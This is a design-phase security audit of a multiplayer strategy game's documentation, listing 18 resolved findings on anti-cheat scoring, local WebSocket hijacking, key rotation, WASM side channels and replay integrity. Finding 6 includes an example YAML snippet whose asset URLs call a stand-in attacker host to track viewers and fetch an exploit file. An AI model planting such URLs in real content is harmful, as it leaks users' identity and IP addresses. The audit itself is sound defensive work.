## Security Audit Findings

Comprehensive verification of anti-cheat logic and security across the Iron Curtain design documentation. This audit cross-references `06-SECURITY.md` (56 vulnerabilities), `architecture/api-misuse-defense.md` (88 misuse vectors), `tracking/testing-strategy.md`, `03-NETCODE.md`, `04-MODDING.md`, `07-CROSS-ENGINE.md`, `architecture/type-safety.md`, `decisions/09b/D052-community-servers.md`, `decisions/09f/D071-external-tool-api.md`, and `decisions/09g/D058-command-console.md` / `D059-communication.md`.

**Audit date:** 2025-06
**Scope:** Design-phase verification — no implementation code exists. Findings target design gaps, inconsistencies, missing threat coverage, and specification ambiguities.

**Resolution status:** All 18 findings **CLOSED** in design docs (2025-06). See cross-references below.

---

### Resolution Summary

| Finding | Severity | Resolution                                                                 | Cross-Reference             |
| ------- | -------- | -------------------------------------------------------------------------- | --------------------------- |
| F1      | HIGH     | CLOSED — Pipeline-wide NaN guards with fail-closed semantics               | V34 amended, proptest added |
| F2      | HIGH     | CLOSED — New vulnerability entry with origin validation + challenge secret | V57 added                   |
| F3      | HIGH     | CLOSED — Monotonic sequence number + cooldown + conflict resolution        | V47 amended                 |
| F4      | HIGH     | CLOSED — V48 model resolved: TOFU + RK rotation (no CRL needed)            | V48 rewritten               |
| F5      | MEDIUM   | CLOSED — Pre-filter by fog + constant-time padding                         | V5 amended, proptest added  |
| F6      | MEDIUM   | CLOSED — External URL blocking during replay playback                      | V41 amended, proptest added |
| F7      | MEDIUM   | CLOSED — 120-second minimum observer delay floor for ranked                | V59 added                   |
| F8      | MEDIUM   | CLOSED — `.iccmd` added to Workshop supply chain scope                     | V18 amended                 |
| F9      | MEDIUM   | CLOSED — Separate `order_stream_hash` from `replay_hash`                   | V13 amended                 |
| F10     | MEDIUM   | CLOSED — Explicit WASI networking denial                                   | V5 amended                  |
| F11     | MEDIUM   | CLOSED — Concrete weighting algorithm with factor normalization            | V12 amended                 |
| F12     | MEDIUM   | CLOSED — New vulnerability entry: settings notification + ranked whitelist | V58 added                   |
| F13     | LOW      | CLOSED — Canonical cross-reference table D059 ↔ ProtocolLimits             | V15 amended                 |
| F14     | LOW      | CLOSED — `todo!()` implementation guard + CI test                          | V35 amended                 |
| F15     | LOW      | CLOSED — `_private: ()` validated construction for alpha                   | V34 amended                 |
| F16     | LOW      | CLOSED — Documented as known lockstep limitation + layered mitigations     | V60 added                   |
| F17     | LOW      | CLOSED — Sparse storage spec with pruning + estimates                      | V26 amended                 |
| F18     | LOW      | CLOSED — Dev mode toggle as PlayerOrder in order stream                    | V44 amended                 |

---

### Summary

The security architecture is **comprehensive and well-structured** for a design-phase project. The 56 documented vulnerabilities in `06-SECURITY.md` cover the major attack surfaces of a competitive multiplayer RTS with community modding. The layered defense philosophy (prevention → detection → deterrence), population-baseline anti-cheat adaptation, and type-system defenses (27 compile-time blocks across 88 API misuse vectors) demonstrate serious security engineering.

**Strengths:**
- Threat matrix covers 56 distinct vulnerabilities across all subsystems
- Relay-as-trust-anchor provides a strong security foundation
- Workshop supply chain defense has 5 independent layers (V18)
- Anti-cheat dual-model detection draws from successful open-source precedents (Lichess, FairFight, DDNet)
- Path security via `strict-path` is consistent across all file-handling surfaces
- Cross-engine trust tiers (V36 / 07-CROSS-ENGINE.md) explicitly classify and communicate security posture
- Type-safety document enforces 13 distinct compile-time defense patterns
- Wave ban strategy and continuous calibration loop address detection evasion
- Testing strategy includes 18 fuzz targets, 17 proptest properties, and labeled replay corpus

**This audit found 18 findings**: 4 high-severity, 8 medium-severity, 6 low-severity.

---

### Finding 1: NaN Propagation Chain in Anti-Cheat Scoring Pipeline

**Severity: HIGH**
**Affected:** V12, V34, V36 (06-SECURITY.md)

V34 adds NaN guards to `EwmaTrafficMonitor`, but the broader anti-cheat scoring pipeline has multiple `f64` stages without documented NaN guards:

```
PlayerBehaviorProfile (f64 fields)
  → behavioral_score (f64, 0.0–1.0)
    → DualModelAssessment.combined (f64)
      → AntiCheatAction threshold comparisons
```

Also affected:
- `TrustFactors.report_rate`, `commend_rate`, `abandon_rate` (all `f64`)
- `PopulationBaseline.apm_p99`, `entropy_p5` (both `f64`)

A NaN at any stage propagates to all downstream threshold comparisons. Since `NaN > 0.75` is `false` and `NaN < 0.5` is also `false`, a NaN in `combined` would cause the anti-cheat action logic to return `Clear` — giving a cheater immunity.

**Recommendation:** Apply V34's NaN guard pattern to **every** `f64` field in the anti-cheat pipeline: after every computation of `behavioral_score`, `statistical_score`, `combined`, and all `TrustFactors` fields. Add a proptest property: "No sequence of inputs produces NaN in any anti-cheat scoring field." Add to testing-strategy.md's proptest section.

**Milestone:** M4 (anti-cheat infrastructure)

---

### Finding 2: ICRP Local WebSocket — Cross-Site WebSocket Hijacking (CSWSH)

**Severity: HIGH**
**Affected:** D071 (09f/D071-external-tool-api.md)

ICRP exposes a local JSON-RPC 2.0 WebSocket server. This opens a Cross-Site WebSocket Hijacking attack: a malicious webpage loaded in any browser can connect to `ws://localhost:PORT` and issue ICRP commands. The SHA-256 challenge auth partially mitigates this, but:

1. The challenge secret must be stored locally (file or environment variable). Any local process or browser extension with filesystem read access can obtain it.
2. The doc does not specify **Origin header validation** — the WebSocket server should reject connections from non-`localhost` origins.
3. No CORS restrictions are documented for the HTTP fallback endpoint.
4. Browser-based attacks from `http://evil.com` could connect if no Origin check exists.

**Recommendation:**
- Mandate `Origin` header validation: accept only `null` (local file) and `http://localhost:*` / `http://127.0.0.1:*`
- Require CORS whitelist for HTTP fallback endpoint (no `Access-Control-Allow-Origin: *`)
- Document the challenge secret storage location and file permissions (e.g., `0600` / user-only read)
- Add CSWSH to the threat model in `06-SECURITY.md`

**Milestone:** M3 (ICRP ships Phase 2–3)

---

### Finding 3: V47 Key Rotation — Dual-Signature Race Condition

**Severity: HIGH**
**Affected:** V47 (06-SECURITY.md), D052 (09b/D052-community-servers.md)

The `KeyRotation` struct requires signatures from both old and new keys. If the old key is compromised, the attacker possesses it. Both the legitimate user and attacker can simultaneously issue valid `KeyRotation` messages:

- Attacker: rotates old → attacker's new key (signed by old + attacker's new)
- Legitimate user: rotates old → user's recovery key (signed by old + user's new)

Both are structurally valid. The protocol doesn't specify:
- Tiebreaker when two conflicting rotations arrive at the same relay
- Monotonic sequence number requirement for rotation messages
- A cooldown between rotation operations

The BIP-39 emergency rotation (immediate, bypass old key) is the correct recovery path, but the standard rotation path has a TOCTOU window.

**Recommendation:**
- Require monotonic `rotation_sequence_number` in `KeyRotation` — community server accepts only the first valid rotation for a given old key
- Add a 24-hour cooldown between non-emergency rotations for the same key
- Specify that emergency rotation (via BIP-39 mnemonic) always takes priority over standard rotation
- Document the conflict resolution rule: "first valid rotation seen by the community authority wins; subsequent conflicting rotations are rejected"

**Milestone:** M8 (identity key management ships Phase 5)

---

### Finding 4: V48 Server Trust Model — Resolved by TOFU Canonicalization

**Severity: HIGH**
**Affected:** V48 (06-SECURITY.md)

**Original finding:** V48 specified a CRL/OCSP certificate revocation model without defining unknown-status behavior (soft-fail vs hard-fail). This was a genuine gap.

**Resolution:** The V48 trust model has been rewritten to align with D052's canonical TOFU + SK/RK two-key hierarchy. IC does not use a CA/CRL/OCSP infrastructure — community servers are self-sovereign with SSH/PGP-style trust-on-first-use. This eliminates the CRL unknown-status problem entirely: there is no CRL to go stale and no OCSP endpoint to become unreachable.

The equivalent ambiguity in the TOFU model ("what happens when key state is ambiguous?") is now resolved by V48's connection policy table: key match → proceed, valid rotation chain → update and proceed, no valid chain → reject for ranked / warn for unranked / warn-only for LAN. First ranked connections require seed list or manual trust verification.

**Milestone:** M5 (identity key management ships Phase 5)

---

### Finding 5: WASM Timing Side-Channel Maphack

**Severity: MEDIUM**
**Affected:** V5 (06-SECURITY.md), 04-MODDING.md WASM Sandbox

The WASM capability model prevents direct access to fogged state (`no get_all_units()`). However, a malicious WASM mod could infer fogged information via timing side channels:

- `ic_query_units_in_range()` execution time correlates with the number of units in the spatial index, including fogged units (the spatial index operates on world state, not per-player visibility)
- A mod measuring host call duration across successive ticks can detect unit movement in fogged regions
- This is a maphack variant that bypasses the capability model entirely

**Recommendation:**
- Host API functions that query spatial data must first filter by the calling player's fog-of-war before performing the query — NOT filter the results after the query
- Alternatively, pad all spatial query host calls to a constant execution time (ceiling of worst-case for the map size)
- Add "timing oracle resistance" as a WASM host API design principle in `04-MODDING.md`
- In fog-authoritative mode, this is not exploitable (fogged entities don't exist on the client). Document this as an additional argument for fog-authoritative for competitive play.

**Milestone:** M7 (WASM modding ships Phase 4–6)

---

### Finding 6: Replay Viewer External Asset Fetch via Embedded YAML

**Severity: MEDIUM**
**Affected:** V41 (06-SECURITY.md)

V41 restricts `SelfContained` replays to map data and rule YAML only (no Lua/WASM). However, embedded YAML rules could contain external asset references:

```yaml
# Embedded in a SelfContained replay's rules
faction_icon: "https://evil.com/track.png?viewer={player_id}"
custom_sprite: "https://evil.com/exploit.shp"
```

If the replay viewer loads these YAML rules and the asset loader follows external URLs, the viewer's IP and potentially identity are leaked to the attacker's server. This enables:
- Viewer tracking (who watched the replay and when)
- De-anonymization (IP to profile correlation)
- Potential asset parser exploitation (V38) via crafted remote assets

**Recommendation:**
- During replay playback of `SelfContained` replays, **disable all external asset resolution**. Asset references must resolve to locally cached content or fail silently with a placeholder.
- Add to V41's "Content-type restriction": "Embedded YAML asset references are resolved only against locally installed content. Remote URLs in embedded rules are ignored."
- Add network isolation for replay playback to the testing strategy

**Milestone:** M4 (replay system ships Phase 2, SelfContained ships Phase 5)

---

### Finding 7: Missing Spectator Delay in Ranked Security Policy

**Severity: MEDIUM**
**Affected:** D071, 06-SECURITY.md Competitive Integrity Summary

D071 mentions "ranked mode restricts to observer-with-delay" but neither `06-SECURITY.md` nor D071 specifies:

- The minimum delay value for ranked match observation
- Whether the delay is configurable per community server (could be set to 0, defeating the purpose)
- Whether live coaching (spectator communicating with a player) is detectable

In fog-authoritative mode, spectators see the full game state. Without a mandatory minimum delay, a spectator could relay fogged information to a player via out-of-band channels (Discord, phone) with trivial latency.

**Recommendation:**
- Define a **minimum observer delay floor** for ranked matches (e.g., 120 seconds / 2,400 ticks at Normal ~20 tps — enough that tactical information is stale). The floor is enforced in wall-clock seconds; the relay computes the minimum tick count from the match's game speed preset (V59).
- Make this a `ProtocolLimits`-style hard floor that community servers cannot reduce below for ranked games
- Document this in the Competitive Integrity Summary table
- Add to D055's ranked exit criteria

**Milestone:** M8 (ranked matchmaking ships Phase 5)

---

### Finding 8: Console Script `.iccmd` Supply Chain Not in Workshop Security Model

**Severity: MEDIUM**
**Affected:** D058 (09g/D058-command-console.md), V18 (06-SECURITY.md)

D058 describes Workshop-shareable `.iccmd` console scripts that are lobby-visible and loadable. These scripts are executable content distributed through the Workshop, but V18's supply chain security model (anomaly detection, author signing, quarantine) doesn't explicitly cover `.iccmd` files.

Console scripts could:
- Execute commands that appear benign but subtly affect game settings
- Contain sequences that trigger developer mode in specific conditions
- Be shared socially ("use this script for better performance") as a social engineering vector

**Recommendation:**
- Explicitly add `.iccmd` files to V18's supply chain security scope — they must be subject to the same SHA-256 integrity, author signing (V49), and quarantine (V51) as other Workshop content
- Console scripts must respect the same permission model as direct console commands (D058's command flags — `DEV_ONLY`, `SERVER`, achievement/ranked flags apply per-command within scripts)
- Add a sandboxing note: `.iccmd` scripts execute through the command parser, never as raw Rust/Lua — they can only invoke registered commands, not arbitrary code

**Milestone:** M6 (console ships Phase 3, Workshop scripts Phase 5)

---

### Finding 9: CertifiedMatchResult Integrity When Replay Has Frame Loss

**Severity: MEDIUM**
**Affected:** V13, V45 (06-SECURITY.md)

`CertifiedMatchResult.replay_hash` is SHA-256 of the full replay data. V45 documents that `BackgroundReplayWriter` can lose frames during I/O spikes. If frames are lost:

1. The `replay_hash` in the `CertifiedMatchResult` hashes the **incomplete** replay (with gap markers)
2. A second client's replay of the same match has different content (different frames lost, or no frames lost)
3. The "cross-check" in V13 (`if any player also submitted a replay, verify hashes match`) will **always fail** between clients with different frame loss patterns

This means CertifiedMatchResult cross-verification is fragile — it can only succeed when both clients have identical frame loss patterns (unlikely).

**Recommendation:**
- Separate `replay_hash` from `certified_game_hash`: the `CertifiedMatchResult` should contain a hash of the **order stream** (deterministic, no frame loss) rather than the full replay file (which includes client-specific recording artifacts)
- The replay file hash remains useful for per-file integrity, but the match certification hash should be over deterministic data only
- Add this distinction to V13's struct definition

**Milestone:** M4 (replay system ships Phase 2)

---

### Finding 10: V43 WASM Network Access — Raw Socket Ambiguity

**Severity: MEDIUM**
**Affected:** V43 (06-SECURITY.md), 04-MODDING.md

V43's DNS rebinding mitigation assumes the host mediates all network access. But the doc doesn't explicitly state that WASM mods **cannot** perform raw socket operations. The WASM capability model (`ModCapabilities.network`) defines `AllowList(Vec<String>)` but the host API surface for network access isn't fully enumerated.

If a WASM mod has access to a general-purpose HTTP function that accepts arbitrary URLs, the DNS pinning and IP range blocking must be in that function. But if the mod somehow obtains lower-level access (e.g., via a WASI preview2 socket capability), it could bypass the host's network filtering entirely.

**Recommendation:**
- Explicitly state: "WASM mods access the network **exclusively** through host-provided `ic_http_get()` / `ic_http_post()` imports. No WASI networking capabilities are granted. Raw socket, DNS resolution, and TCP/UDP access are never available to WASM modules."
- Add to `04-MODDING.md` § WASM Sandbox Rules and cross-reference from V43
- The `wasmtime` configuration must explicitly deny WASI networking — document this as a Phase 4 exit criterion

**Milestone:** M7 (WASM modding ships Phase 4)

---

### Finding 11: TrustScore Computation Algorithm Unspecified

**Severity: MEDIUM**
**Affected:** V12 (06-SECURITY.md)

`TrustScore.score` is `u16` (0–12000) and `TrustFactors` contains 7 `f64`/`u32`/`u8` fields, but:

- The weighting algorithm converting factors to score is not specified
- Factor ranges and normalization are undefined (what `account_age_days` value maps to what contribution?)
- No specification prevents trivial gaming: creating old accounts that sit idle → high `account_age_days` → higher trust without actual gameplay

Without a specified algorithm, implementations could create vastly different trust behaviors across community servers, undermining the design's purpose.

**Recommendation:**
- Define the default weighting formula (even as pseudocode) with documented factor contributions
- Specify normalization: `account_age_days` saturates at (e.g.) 365 days contribution
- `rated_games_played` should have a minimum threshold before positively influencing trust (e.g., first 20 games do not contribute)
- `anti_cheat_points` should be the dominant negative factor — no positive factor should override active anti-cheat flags
- Mark this as configurable per community but with defined defaults

**Milestone:** M8 (trust score ships Phase 5)

---

### Finding 12: Lobby Host Configuration Manipulation

**Severity: MEDIUM**
**Affected:** Not covered in 06-SECURITY.md

The security document doesn't address malicious lobby hosts. In IC's relay architecture, the lobby host sets game parameters (map, rules, balance preset, game speed). A malicious host could:

- Configure asymmetric starting conditions (more resources for self)
- Select obscure balance presets that advantage specific factions
- Set developer mode during lobby setup in ways that aren't visible to joining players
- Modify lobby settings after players join but before they notice

The relay server validates orders during gameplay but the lobby configuration itself isn't validated for fairness.

**Recommendation:**
- Add a Vulnerability entry covering lobby configuration manipulation
- Lobby settings changes after a player joins should trigger a visible notification to all players
- Ranked lobbies should validate settings against a whitelist of ranked-eligible configurations (map pool, standard balance presets, standard game speed)
- All lobby settings must be included in the match metadata visible to the ranking authority

**Milestone:** M5 (lobby/matchmaking ships Phase 5)

---

### Finding 13: Cross-Reference Inconsistency — V15 ProtocolLimits Field Duplication

**Severity: LOW**
**Affected:** V15, V17 (06-SECURITY.md), 03-NETCODE.md

`ProtocolLimits` is fully defined in V15 with all fields (including D059 voice/coordination limits). V17 references it but says `// ... fields defined in V15 above`. However, `03-NETCODE.md` § Order Rate Control also references `ProtocolLimits` but only links to `06-SECURITY.md` without defining which fields exist.

The D059 voice limits (`max_voice_packets_per_second: 50`, `max_pings_per_interval: 3`) were added to the V15 struct definition but are not cross-referenced in D059's own security considerations table (which lists rate limits but doesn't reference the specific `ProtocolLimits` field names).

**Recommendation:**
- Add a cross-reference from D059's security table to `06-SECURITY.md` V15's `ProtocolLimits` struct — the specific field names and values should be traceable
- Consider making `ProtocolLimits` a standalone definition in `03-NETCODE.md` (the canonical netcode doc) with `06-SECURITY.md` as the threat-model counterpart

**Milestone:** Documentation cleanup, no implementation change needed

---

### Finding 14: V35 SimReconciler Constants — Deferral Risk

**Severity: LOW**
**Affected:** V35 (06-SECURITY.md), 07-CROSS-ENGINE.md

V35 defines `MAX_TICKS_SINCE_SYNC = 300`, `MAX_CREDIT_DELTA = 5000`, health cap at 1000 — but explicitly states these are "deferred to M7" and "not part of M4 exit criteria." This creates a risk: if cross-engine reconciliation is implemented before M7 (even experimentally), the bounds enforcement may be forgotten since it's explicitly deferred.

**Recommendation:**
- The constants are correctly defined. Add a build-time assertion or `todo!()` marker in the reconciler code path that fires if bounds checking is missing — similar to `unimplemented!()` but with a reference to V35.
- Ensure the milestone dependency map has a hard edge from reconciler implementation to V35 bounds enforcement.

**Milestone:** M7 (confirmed deferral, no change needed — just add implementation-time guard)

---

### Finding 15: V34 EWMA NaN Guard — Alpha Validation Timing

**Severity: LOW**
**Affected:** V34 (06-SECURITY.md)

V34 says "`alpha` is validated at construction to be in `(0.0, 1.0)` exclusive." However, the `EwmaTrafficMonitor` struct has `pub alpha: f64` — a public field that can be modified after construction, bypassing the construction-time validation.

**Recommendation:**
- Make `alpha` private with a validated setter, consistent with the Validated Construction Policy in `architecture/type-safety.md`
- Or use the `_private: ()` pattern from the type-safety document to prevent direct construction

**Milestone:** M4 (traffic monitor implementation)

---

### Finding 16: Missing Threat — Observer Mode RNG State Leak

**Severity: LOW**
**Affected:** 06-SECURITY.md, 03-NETCODE.md

In lockstep mode, all clients share the same deterministic RNG state. Observers receive all orders and run the full simulation. If an observer has access to the RNG state (which they must, to run the sim), they can predict:
- Random crate spawns before they appear
- AI decision outcomes
- Any randomized game mechanic

Combined with out-of-band communication, this enables prediction-based advantage for a player cooperating with an observer. In fog-authoritative mode, this is less of a concern (observer gets filtered state), but in standard lockstep relay mode, the observer has everything.

**Recommendation:**
- Document this as a known limitation of lockstep observer mode
- The ranked observer delay (Finding 7) mitigates the competitive impact
- For tournament play with live observers, fog-authoritative mode should be recommended

**Milestone:** No implementation change — documentation addition

---

### Finding 17: V26 Win-Trading — Storage Cost of Per-Pair Match History

**Severity: LOW**
**Affected:** V26 (06-SECURITY.md)

The diminishing returns formula (`0.5^(n-1)`) requires tracking per-opponent-pair match counts within a rolling 30-day window. For a community with P players, the worst-case storage is O(P²) opponent pairs. The doc doesn't address:
- Whether this is stored in the same SQLite database as ratings
- Index strategy for efficient lookup during rating computation
- Cleanup strategy for expired 30-day windows

For 10,000 active players, worst-case is ~100M pair entries (though typically much sparser).

**Recommendation:**
- Specify that opponent-pair tracking uses a sparse representation (only pairs with ≥1 match are stored)
- Add an expiry cleanup job that runs with the weekly population baseline recalculation
- Document the expected storage: ~50 bytes per match pair × active pairs per month

**Milestone:** M8 (ranked system ships Phase 5)

---

### Finding 18: V44 Developer Mode — Single-Player Toggle vs Replay Determinism

**Severity: LOW**
**Affected:** V44 (06-SECURITY.md)

V44 states "In single-player and replays, dev mode can be toggled freely." But dev mode is a sim `Resource` in `ic-sim` (part of deterministic state). If a player toggles dev mode mid-game in single-player, the replay records this toggle. If someone views the replay without knowing dev mode was used, the replay's behavior may be confusing (e.g., instant builds happening with no visible explanation).

V44 also states "Replays record the dev mode flag" — but this appears to be a per-match flag, not a per-tick state. If dev mode is toggled mid-game, the per-match flag doesn't capture the toggling pattern.

**Recommendation:**
- Dev mode toggles should be recorded as `PlayerOrder::DevCommand(DevAction::ToggleDevMode)` in the replay order stream — not just a header flag
- The replay viewer should display a visible indicator when dev mode is active during playback
- This is consistent with the existing order-based architecture (dev mode changes go through the order pipeline)

**Milestone:** M4 (replay system ships Phase 2)

---

### Audit Coverage Matrix

| Security Domain                           | Documents Reviewed           | Vulnerabilities Covered | Findings          |
| ----------------------------------------- | ---------------------------- | ----------------------- | ----------------- |
| Anti-cheat / behavioral analysis          | V12, V34, V36, V54, V55      | 5                       | F1, F7            |
| Network / transport                       | V14, V15, V17, V24, V32      | 5                       | F2, F13           |
| Identity / credentials                    | V47, V48, D052               | 3                       | F3, F4            |
| Modding sandbox (WASM/Lua)                | V5, V39, V43, V50            | 4                       | F5, F10           |
| Workshop supply chain                     | V18–V23, V49, V51, V52       | 8                       | F8                |
| Replay / save integrity                   | V41, V42, V45, V6            | 4                       | F6, F9, F18       |
| Ranked / competitive                      | V26–V31, V33, V44            | 8                       | F7, F11, F12, F17 |
| Cross-engine                              | V35, V36, 07-CROSS-ENGINE.md | 2                       | F14               |
| External tools (ICRP)                     | D071                         | 1                       | F2                |
| Player identity / display                 | V46, V56                     | 2                       | —                 |
| Format parsing (cnc-formats + ra-formats) | V38                          | 1                       | —                 |
| LLM content                               | V40                          | 1                       | —                 |
| Console / communication                   | D058, D059                   | 2                       | F8                |
| Spectator / observer                      | D071, D055                   | —                       | F7, F16           |
| Lobby configuration                       | Not covered                  | 0                       | F12               |

### Verification: Known-Good Areas

These areas were audited and found to be well-designed with no gaps:

- **V38 ra-formats parser safety:** Comprehensive — decompression ratio caps, per-format entry limits, iteration counters, mandatory fuzzing, Zip Slip defense via strict-path. Well-referenced across documents.
- **V18 Workshop supply chain:** Five independent layers with academic precedent citations (fractureiser, npm, crates.io). Defense-in-depth is thorough.
- **V2 Order validation:** Deterministic validation inside sim (D012) is architecturally sound — validation IS the anti-cheat, not a bolt-on.
- **V14 Transport encryption:** Follows GNS/DTLS patterns. Sequence-bound nonces, identity binding, mandatory encryption — no shortcuts.
- **V46 Display name Unicode:** UTS #39 skeleton algorithm + mixed-script restriction + BiDi stripping — covers the known attack surface comprehensively.
- **Type-safety architecture:** 13 distinct patterns from newtypes to verified wrappers. The `_private: ()` pattern and typestate machines are well-applied to security-critical state machines.
- **Path security infrastructure:** Consistent use of `strict-path PathBoundary` across all 7 integration points. Addresses 19+ CVE patterns.
- **V3 Lag switch + V11 Speed hack:** Relay-as-clock-authority is a structural defense. The strike system and behavioral integration are well-designed.
- **Cross-engine trust tiers (07-CROSS-ENGINE.md):** Explicit security comparison matrix for IC-hosts vs IC-joins. Correctly recommends "always prefer IC as host."
